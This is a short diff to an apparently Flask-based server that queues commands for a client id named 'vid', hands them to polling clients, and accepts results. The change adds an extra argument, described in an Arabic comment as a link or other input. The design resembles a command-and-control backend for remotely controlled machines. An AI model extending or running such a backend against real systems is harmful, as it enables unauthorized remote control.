@@ -27,16 +27,17 @@ def send_command():
     data = request.json
     vid = data.get('vid')
     cmd = data.get('cmd')
-    COMMANDS[vid] = cmd
+    arg = data.get('arg', '') # استقبال الرابط أو أي إدخال إضافي
+    COMMANDS[vid] = {"cmd": cmd, "arg": arg}
     return jsonify({"status": "sent"}), 200
 
 @app.route('/check_command/<vid>', methods=['GET'])
 def check_command(vid):
     if vid in COMMANDS:
-        cmd = COMMANDS[vid]
+        cmd_data = COMMANDS[vid]
         del COMMANDS[vid] 
-        return jsonify({"command": cmd}), 200
-    return jsonify({"command": "none"}), 200
+        return jsonify(cmd_data), 200
+    return jsonify({"command": "none", "arg": ""}), 200
 
 @app.route('/result', methods=['POST'])
 def result():
